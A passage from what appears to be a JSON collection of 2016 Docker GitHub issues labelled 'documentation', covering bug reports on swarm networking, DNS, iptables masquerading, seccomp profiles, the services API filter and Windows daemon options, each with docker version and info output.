C:\\Users\\Administrator> dockerd --live-restore --register-service\r\nStatus: unknown flag: --live-restore\r\nSee 'dockerd --help'., Code: 125\r\n```\r\n2. When I added ``` \"live-restore\": true ``` to the daemon.json and started dockerd I got another error\r\n```\r\nPS C:\\Users\\Administrator> dockerd\r\nunable to configure the Docker daemon with file C:\\ProgramData\\docker\\config\\daemon.json: the following directives don't match any configuration option: live-restore\r\n```\r\n\r\n**Expected behaviour:**\r\nI expect that dockerd should run successfully with this option. Or at least have mention in the documentation that it is not supported\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.2-cs2-ws-beta\r\n API version:  1.25\r\n Go version:   go1.7.1\r\n Git commit:   050b611\r\n Built:        Tue Oct 11 02:35:40 2016\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      1.12.2-cs2-ws-beta\r\n API version:  1.25\r\n Go version:   go1.7.1\r\n Git commit:   050b611\r\n Built:        Tue Oct 11 02:35:40 2016\r\n OS/Arch:      windows/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 1\r\n Running: 0\r\n Paused: 0\r\n Stopped: 1\r\nImages: 1\r\nServer Version: 1.12.2-cs2-ws-beta\r\nStorage Driver: windowsfilter\r\n Windows:\r\nLogging Driver: json-file\r\nPlugins:\r\n Volume: local\r\n Network: nat null overlay\r\nSwarm: inactive\r\nDefault Isolation: process\r\nKernel Version: 10.0 14393 (14393.321.amd64fre.rs1_release_inmarket.161004-2338)\r\nOperating System: Windows Server 2016 Datacenter\r\nOSType: windows\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 4 GiB\r\nName: EC2AMAZ-P7L1INT\r\nID: 6JSQ:WIFX:QJ25:TM5T:JBOG:CR7M:NSOW:X2AJ:QJXR:PRID:CLE2:6Q67\r\nDocker Root Dir: C:\\ProgramData\\docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nIt is a EC2 instance which was launched from \"Windows Server 2016 with containers image\""},{"labels":["documentation",null],"text":"Currently our CI does not build the man pages, so we do not know if there are issues with PRs or problems with the build process.\r\n\r\nI tried to get this to work in #25884 and it mysteriously failed, it would never download the alpine packages from CI, and no one has an explanation (it is fine locally) so it needs looking at.\r\n\r\nOnce that is fixed I can reopen the PR to put them in the `tgz`.\r\n\r\ncc @dnephin \r\n"},{"labels":["documentation",null,null,null,null],"text":"[dns_docker_issue.zip](https://github.com/docker/docker/files/579919/dns_docker_issue.zip)\r\n\r\n**Description**\r\nAfter repeatedly hitting inconsistent behavior when starting up an application infrastructure with a number of swarm mode networks and services, I narrowed it down to a reproducible use-case.  It is still occasionally inconsistent, especially on AWS for docker beta (where I hit it initially), but I am able to reliably produce the issue on a local vbox docker-machine, which I detail below.\r\n\r\n**Steps to reproduce the issue:**\r\nAlso see the attached a script that I've used to run through the issue.\r\n\r\n1. Set-up a local docker-machine, into swarm mode.  I used ...\r\ndocker-machine create --driver virtualbox --virtualbox-memory 3072 --virtualbox-disk-size 20000 net-test-machine\r\ndocker swarm init --advertise-addr <machineip>\r\n\r\n2. Set up some swarm mode networks.  The order is important.  If the internal network is last, it works.\r\ndocker network create --driver overlay test_nw_1\r\ndocker network create --driver overlay --internal test_internal_nw\r\ndocker network create --driver overlay test_nw_2\r\n\r\n3. Run a service, on which you can check DNS\r\ndocker service create --name dns-test-service --restart-max-attempts=1 --replicas=1 --network test_nw_2 alpine nslookup www.google.com\r\n\r\n4. Check the results\r\ndocker service ps dns-test-service\r\n`ID                         NAME                    IMAGE   NODE              DESIRED STATE  CURRENT STATE          ERROR\r\n8kuzzunxubqdj4nzyn3v8kuc8  dns-test-service.1      alpine  net-test-machine  Shutdown       Failed 2 seconds ago   \"task: non-zero exit (1)\"\r\n7zihw5somacz9g945j8pac79h   \\_ dns-test-service.1  alpine  net-test-machine  Shutdown       Failed 12 seconds ago  \"task: non-zero exit (1)\"`\r\n\r\nThe above service was chosen as it was concise, but I could run the same test with an 'alpine sleep', exec in, and clearly see that Internet access was ok, but hosts would not resolve.\r\n\r\n\r\n**Describe the results you received:**\r\nWithin the container, the DNS doesn't work.  You can't ping www.google.com, but you can ping, for instance, 8.8.8.8\r\n\r\n**Describe the results you expected:**\r\nThe containers should have working DNS.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nI've hit this on AWS for Docker Beta, and a local docker-machine VirtualBox environment.  In the case of Virtualbox, I experimented with altering the virtualbox to 1.12.1/.2 as well as 3, but the issue remained and I can reliably recreate this from scratch.\r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 23:26:11 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 53\r\n Running: 0\r\n Paused: 0\r\n Stopped: 53\r\nImages: 1\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /mnt/sda1/var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 107\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: null overlay bridge host\r\nSwarm: active\r\n NodeID: caecow8uwead466cylqpa58m1\r\n Is Manager: true\r\n ClusterID: 2i7xeimsxlbbe3cndrwhzr5pv\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.99.100\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: seccomp\r\nKernel Version: 4.4.27-boot2docker\r\nOperating System: Boot2Docker 1.12.3 (TCL 7.2); HEAD : 7fc7575 - Thu Oct 27 17:23:17 UTC 2016\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 2.937 GiB\r\nName: net-test-machine\r\nID: 2I6J:XEPY:H3MW:5EDI:ZODN:T4LD:MHY3:LCRW:A2WK:BXHN:P4JG:KIOJ\r\nDocker Root Dir: /mnt/sda1/var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 239\r\n Goroutines: 429\r\n System Time: 2016-11-09T03:02:31.153116336Z\r\n EventsListeners: 0\r\nUsername: codadoc\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\n provider=virtualbox\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nI have docker-machine version 0.8.2, build e18a919\r\n\r\nI hit the issue also in AWS for Docker Beta 1.12.3, where it was prevalent, but more inconsistent.\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. http://10.7.0.94:2375/services?filters={\"id\":[\"<node-id>\"]}\r\n2. http://10.7.0.94:2375/services?filters={\"id\":[\"<service-id>\"]}\r\n3.\r\n\r\n**Describe the results you received:**\r\n1. [ ]\r\n2. Service filtered by id.\r\n\r\n**Describe the results you expected:**\r\n1. Array of services filtered by node id.\r\n2. [ ]\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nAPI Docs state  <node id> as a filter parameter whereas service method filters by <service id> instead.\r\nHow can I get the list of services running on a particular node or with instances running on a specific node?\r\n\r\n**Output of `docker version`:**\r\n\r\n\r\n```\r\nDocker v 1.12.3\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n{\r\n  \"ID\": \"TZFE:3XXK:PYKN:NIYU:BEQF:YNPU:4LKC:WFFG:LJ52:4UGQ:WJXH:SWDS\",\r\n  \"Containers\": 4,\r\n  \"ContainersRunning\": 4,\r\n  \"ContainersPaused\": 0,\r\n  \"ContainersStopped\": 0,\r\n  \"Images\": 23,\r\n  \"Driver\": \"devicemapper\",\r\n  \"DriverStatus\": [\r\n    [\r\n      \"Pool Name\",\r\n      \"docker-253:0-752710-pool\"\r\n    ],\r\n    [\r\n      \"Pool Blocksize\",\r\n      \"65.54 kB\"\r\n    ],\r\n    [\r\n      \"Base Device Size\",\r\n      \"10.74 GB\"\r\n    ],\r\n    [\r\n      \"Backing Filesystem\",\r\n      \"xfs\"\r\n    ],\r\n    [\r\n      \"Data file\",\r\n      \"/dev/loop0\"\r\n    ],\r\n    [\r\n      \"Metadata file\",\r\n      \"/dev/loop1\"\r\n    ],\r\n    [\r\n      \"Data Space Used\",\r\n      \"7.089 GB\"\r\n    ],\r\n    [\r\n      \"Data Space Total\",\r\n      \"107.4 GB\"\r\n    ],\r\n    [\r\n      \"Data Space Available\",\r\n      \"100.3 GB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Used\",\r\n      \"9.732 MB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Total\",\r\n      \"2.147 GB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Available\",\r\n      \"2.138 GB\"\r\n    ],\r\n    [\r\n      \"Thin Pool Minimum Free Space\",\r\n      \"10.74 GB\"\r\n    ],\r\n    [\r\n      \"Udev Sync Supported\",\r\n      \"true\"\r\n    ],\r\n    [\r\n      \"Deferred Removal Enabled\",\r\n      \"false\"\r\n    ],\r\n    [\r\n      \"Deferred Deletion Enabled\",\r\n      \"false\"\r\n    ],\r\n    [\r\n      \"Deferred Deleted Device Count\",\r\n      \"0\"\r\n    ],\r\n    [\r\n      \"Data loop file\",\r\n      \"/var/lib/docker/devicemapper/devicemapper/data\"\r\n    ],\r\n    [\r\n      \"Metadata loop file\",\r\n      \"/var/lib/docker/devicemapper/devicemapper/metadata\"\r\n    ],\r\n    [\r\n      \"Library Version\",\r\n      \"1.02.107-RHEL7 (2016-06-09)\"\r\n    ]\r\n  ],\r\n  \"SystemStatus\": null,\r\n  \"Plugins\": {\r\n    \"Volume\": [\r\n      \"local\"\r\n    ],\r\n    \"Network\": [\r\n      \"overlay\",\r\n      \"bridge\",\r\n      \"null\",\r\n      \"host\"\r\n    ],\r\n    \"Authorization\": null\r\n  },\r\n  \"MemoryLimit\": true,\r\n  \"SwapLimit\": true,\r\n  \"KernelMemory\": true,\r\n  \"CpuCfsPeriod\": true,\r\n  \"CpuCfsQuota\": true,\r\n  \"CPUShares\": true,\r\n  \"CPUSet\": true,\r\n  \"IPv4Forwarding\": true,\r\n  \"BridgeNfIptables\": true,\r\n  \"BridgeNfIp6tables\": false,\r\n  \"Debug\": false,\r\n  \"NFd\": 55,\r\n  \"OomKillDisable\": true,\r\n  \"NGoroutines\": 194,\r\n  \"SystemTime\": \"2016-11-08T16:46:49.153754781+01:00\",\r\n  \"ExecutionDriver\": \"\",\r\n  \"LoggingDriver\": \"json-file\",\r\n  \"CgroupDriver\": \"cgroupfs\",\r\n  \"NEventsListener\": 3,\r\n  \"KernelVersion\": \"3.10.0-327.36.3.el7.x86_64\",\r\n  \"OperatingSystem\": \"CentOS Linux 7 (Core)\",\r\n  \"OSType\": \"linux\",\r\n  \"Architecture\": \"x86_64\",\r\n  \"IndexServerAddress\": \"https://index.docker.io/v1/\",\r\n  \"RegistryConfig\": {\r\n    \"InsecureRegistryCIDRs\": [\r\n      \"127.0.0.0/8\"\r\n    ],\r\n    \"IndexConfigs\": {\r\n      \"docker.io\": {\r\n        \"Name\": \"docker.io\",\r\n        \"Mirrors\": null,\r\n        \"Secure\": true,\r\n        \"Official\": true\r\n      }\r\n    },\r\n    \"Mirrors\": null\r\n  },\r\n  \"NCPU\": 4,\r\n  \"MemTotal\": 8118247424,\r\n  \"DockerRootDir\": \"/var/lib/docker\",\r\n  \"HttpProxy\": \"\",\r\n  \"HttpsProxy\": \"\",\r\n  \"NoProxy\": \"\",\r\n  \"Name\": \"master\",\r\n  \"Labels\": null,\r\n  \"ExperimentalBuild\": false,\r\n  \"ServerVersion\": \"1.12.3\",\r\n  \"ClusterStore\": \"\",\r\n  \"ClusterAdvertise\": \"\",\r\n  \"SecurityOptions\": [\r\n    \"seccomp\"\r\n  ],\r\n  \"Runtimes\": {\r\n    \"runc\": {\r\n      \"path\": \"docker-runc\"\r\n    }\r\n  },\r\n  \"DefaultRuntime\": \"runc\",\r\n  \"Swarm\": {\r\n    \"NodeID\": \"6hftixtprlhop5addjmo7qnxe\",\r\n    \"NodeAddr\": \"10.7.0.94\",\r\n    \"LocalNodeState\": \"active\",\r\n    \"ControlAvailable\": true,\r\n    \"Error\": \"\",\r\n    \"RemoteManagers\": [\r\n      {\r\n        \"NodeID\": \"6hftixtprlhop5addjmo7qnxe\",\r\n        \"Addr\": \"10.7.0.94:2377\"\r\n      }\r\n    ],\r\n    \"Nodes\": 2,\r\n    \"Managers\": 1,\r\n    \"Cluster\": {\r\n      \"ID\": \"5lp9rqb6l7my0ek9jg21cwkf9\",\r\n      \"Version\": {\r\n        \"Index\": 819\r\n      },\r\n      \"CreatedAt\": \"2016-11-03T12:50:34.101987364Z\",\r\n      \"UpdatedAt\": \"2016-11-08T12:50:34.44261306Z\",\r\n      \"Spec\": {\r\n        \"Name\": \"default\",\r\n        \"Orchestration\": {\r\n          \"TaskHistoryRetentionLimit\": 5\r\n        },\r\n        \"Raft\": {\r\n          \"SnapshotInterval\": 10000,\r\n          \"LogEntriesForSlowFollowers\": 500,\r\n          \"HeartbeatTick\": 1,\r\n          \"ElectionTick\": 3\r\n        },\r\n        \"Dispatcher\": {\r\n          \"HeartbeatPeriod\": 5000000000\r\n        },\r\n        \"CAConfig\": {\r\n          \"NodeCertExpiry\": 7776000000000000\r\n        },\r\n        \"TaskDefaults\": {}\r\n      }\r\n    }\r\n  },\r\n  \"LiveRestoreEnabled\": false\r\n}\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nPhysical"},{"labels":["documentation",null,null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nWhen a new user defined docker bridge network is created and the docker daemon has `iptables=false` and `ip-masq=true` the nat masquerade rules are not created for the user defined bridge network. This causes machines attached to this network to have no external access outside of the docker host.\r\n\r\n***Use-Case**\r\nWe are running several containers on a single docker host and don't want Docker to automatically create iptables allow rules for all of the exposed ports for security reasons. We then manage our own iptables rules via Puppet.  Not sure if this is a bug but at the very least the documentation [https://docs.docker.com/engine/reference/commandline/dockerd/#/miscellaneous-options](url) is lacking any details when setting the `iptables` and `ip-masq` settings other then there explicit purpose. When setting `iptables` to false and `ip-masq` to true should Docker still create the masquerade rules related to the containers? I even went ahead and set `com.docker.network.bridge.enable_ip_masquerade=true` and the rules are not created. \r\n\r\n**Steps to reproduce the issue:**\r\n1. Setup a Ubuntu 16.04 Server 64 bit with docker 1.12.3. For this example this server has an IP address on eth0 of 192.168.100.40 and the default gateway is 192.168.100.1. The default gateway accepts pings.\r\n2. Set your Docker daemon with the following flags: `--ip-forward=true --iptables=false --ip-masq=true`\r\n3. Create a new Docker bridge network: `docker network create --driver bridge --gateway=192.168.10.1 --subnet=192.168.10.0/24 --opt \"com.docker.network.bridge.name\"=\"example\" example `\r\n4. Attach and run any container image so you can issue ping commands to the network created above: `docker run -itd --network=example busybox`\r\n5. Exec into the container and attempt to ping 192.168.100.1. \r\n\r\n**Describe the results you received:**\r\nA tcpdump on the server shows packets leaving the host to the correct destination and source but the masquerade iptables nat rules are never created for the new bridge network thus ipables doesnt know were to send the original packets. When I delete the network, turn on `iptables=true`, and recreate the network the correct masquerade rules are created along with all of the rules for the exposed ports which we dont want. \r\n\r\n**Describe the results you expected:**\r\nSince `ip-masq=true` I was expecting the nat masquerading rules to still be created and the exposed ports to not be created in the DOCKER chain. I didnt see anything in the documentation that mentioned the nat rules not being created with the `--iptables=false --ip-masq=true` settings in place. It would be good if the official documentation had more details in how docker is interacting with iptables on the host. At the very least if you disable iptables nat masquerade rules will not be created event though the settings are in place at the daemon and network level.\r\n\r\nI have a workaround of adding the nat masquerade rules via puppet but is this the expected behavior? \r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 15\r\n Running: 15\r\n Paused: 0\r\n Stopped: 0\r\nImages: 41\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /opt/data/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 189\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host null bridge overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor seccomp\r\nKernel Version: 4.4.0-45-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 7.796 GiB\r\nName: server..com\r\nID: XURH:HQYH:VWQ6:25GJ:DB2C:4RVF:B2KL:LJI3:GJ2W:ZYV7:C4T6:Z5LY\r\nDocker Root Dir: /opt/data\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/pull/27995 added templating features for swarm mode, but they were not documented yet.\r\n\r\nThe docs should be updated to document the templating, and include examples on how / when to use them"},{"labels":["documentation",null,null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nI followed Docker Seccomp usage guide [here](https://docs.docker.com/engine/security/seccomp/) and used [default profile](https://raw.githubusercontent.com/docker/docker/master/profiles/seccomp/default.json), and got error:\r\n`docker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"empty string is not a valid syscall\\\"\\n\".\r\n`\r\n\r\n**Steps to reproduce the issue:**\r\n(Essentially just follow the guide in above link)\r\n1. Download default seccomp profile json from [here](https://raw.githubusercontent.com/docker/docker/master/profiles/seccomp/default.json)\r\n2. docker run --rm -it --security-opt seccomp=/path/to/seccomp/profile.json hello-world\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n```\r\nContainers: 0\r\n Running: 0\r\n Paused: 0\r\n Stopped: 0\r\nImages: 2\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 2\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: null host bridge overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor seccomp\r\nKernel Version: 4.4.0-31-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 7.797 GiB\r\nName: myserver\r\nID: RZN7:A4OM:DVGC:3OUT:GEBY:ANAX:3DGF:BE7G:FZ4L:H6O2:4XG7:DGDF\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\nIs this json format outdated? Where can I find a proper guide to write correct one? Thanks in advance!"},{"labels":["documentation"],"text":"per https://github.com/docker/docker/pull/25820#issuecomment-256800737, we need to add documentation for the new metrics API, and probably some examples in other parts of the documentation to show how it's used.\n\nopening this issue for tracking, so that we unblock the PR that implements the feature\n\n/cc @mstanleyjones @crosbymichael  - assigning you both so that we don't forget :smile:\n"},{"labels":["documentation",null,null,null],"text":"---\n## BUG REPORT INFORMATION\n\nServices on overlay network can not communicate with services on other nodes in the same overlay network unless \"All traffic\" is open in an AWS security group. Opening only the documented required ports; `2377`, `4789`, and `7946` on UDP and TCP are insufficient. Even opening all TCP and UDP ports does not work, only selecting \"All traffic\" does.\n\n**Steps to reproduce the issue:**\nOn AWS, inside a VPC:\n1. Create a swarm with `swarm init`, and add other nodes via the supplied `join` command\n2. Create an overlay network, e.g. `docker network create --driver overlay --subnet 10.0.9.0/24 --opt encrypted newnet`\n3. Add a service (service1) to to one node (node1) in the cluster, then add another service (service2) to a different node (node2) in the cluster\n4. Open ports `2377`, `4789`, and `7946` on UDP and TCP in the relevant AWS security group\n4. From inside the service2 container, try to access a port in service1 from service2. For example, if service1 is MySQL, try `telnet service1 3306` from service2\n\n**Describe the results you received:**\nNo access to service1 ports from service2. Only selecting to open \"All traffic\" in the security group works (not even \"All TCP\" and \"All UDP\").\n\n**Describe the results you expected:**\nBe able to reach service1 by only opening the ports required by Docker Swarm (above).\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe strange part is that even selecting \"All TCP\" and \"All UDP\" does not work, only \"All traffic\". So what needs to be open that's not TCP or UDP?\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.2\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   bb80604\n Built:        Tue Oct 11 18:29:41 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.2\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   bb80604\n Built:        Tue Oct 11 18:29:41 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: host null bridge overlay\nSwarm: active\n NodeID: f43qckhb6hifw95hki6ihzbdt\n Is Manager: true\n ClusterID: 3ae1kkzosksoqvqgz6kclguhm\n Managers: 1\n Nodes: 3\n Orchestration:\n  Task History Retention Limit: 5\n Raft:\n  Snapshot Interval: 10000\n  Heartbeat Tick: 1\n  Election Tick: 3\n Dispatcher:\n  Heartbeat Period: 5 seconds\n CA Configuration:\n  Expiry Duration: 3 months\n Node Address: 10.0.11.215\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-43-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 1.952 GiB\nName: ip-10-0-11-215\nID: 6LVV:2FUY:E2TD:DKIR:LFAX:3HF6:6ZZI:65CM:F7YY:CQ2X:IVJO:F23E\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nLabels:\n type=master\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nRunning in AWS inside a VPC on in it's private subnet.\n"},{"labels":["documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\n\nI have docker engine running in swarm mode with 4 nodes in the swarm cluster\n\n**Steps to reproduce the issue:**\n1. I run the command to start a docker service using an image stored in the dockerhub private repo.\nsudo docker service create --name serviceName  --network myNetwork --publish 8761:8761 orgName/imageName:version\n\n**Describe the results you received:**\n1. It seems that if the image does not exist in the local node where the service is scheduled to run, docker does not automatically pull the image from the private repo and the service fails to start\n2. However if I manually pull the image in all of the nodes in the cluster and then start the service, it seems to work. \n\n**Describe the results you expected:**\n1. I expected docker to automatically pull the image from the private repo hosted in the hub. To make sure that there are no connectivity issues I logged into the private repo using docker login in each of the 4 nodes in the cluster to make sure that the credentials to be used to connect to the repo are stored locally in the json file. Is this how its supposed to work? Should it not automatically pull from hub if the image is not available locally? Im I missing something?\n\nAdditional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:\n OS/Arch:      linux/amd64\n\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 201\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:0-204218855-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 4.401 GB\n Data Space Total: 107.4 GB\n Data Space Available: 30.95 GB\n Metadata Space Used: 7.598 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.14 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.107-RHEL7 (2016-06-09)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host null overlay\nSwarm: active\n NodeID: b11gagg35v2tojxnqemze6ey6\n Is Manager: true\n ClusterID: 7f9kda0i54yj0jl8js0vt84u5\n Managers: 3\n Nodes: 4\n Orchestration:\n  Task History Retention Limit: 5\n Raft:\n  Snapshot Interval: 10000\n  Heartbeat Tick: 1\n  Election Tick: 3\n Dispatcher:\n  Heartbeat Period: 5 seconds\n CA Configuration:\n  Expiry Duration: 3 months\n Node Address: 10.1.2.56\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 3.10.0-327.28.2.el7.x86_64\nOperating System: Red Hat Enterprise Linux Server 7.2 (Maipo)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 47.01 GiB\nName: cmcmdmz101\nID: N6XG:EQOG:FPUM:GYCY:HXHQ:DOVU:AHFM:TFBB:4GM6:WKC3:QCN2:6RLP\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): 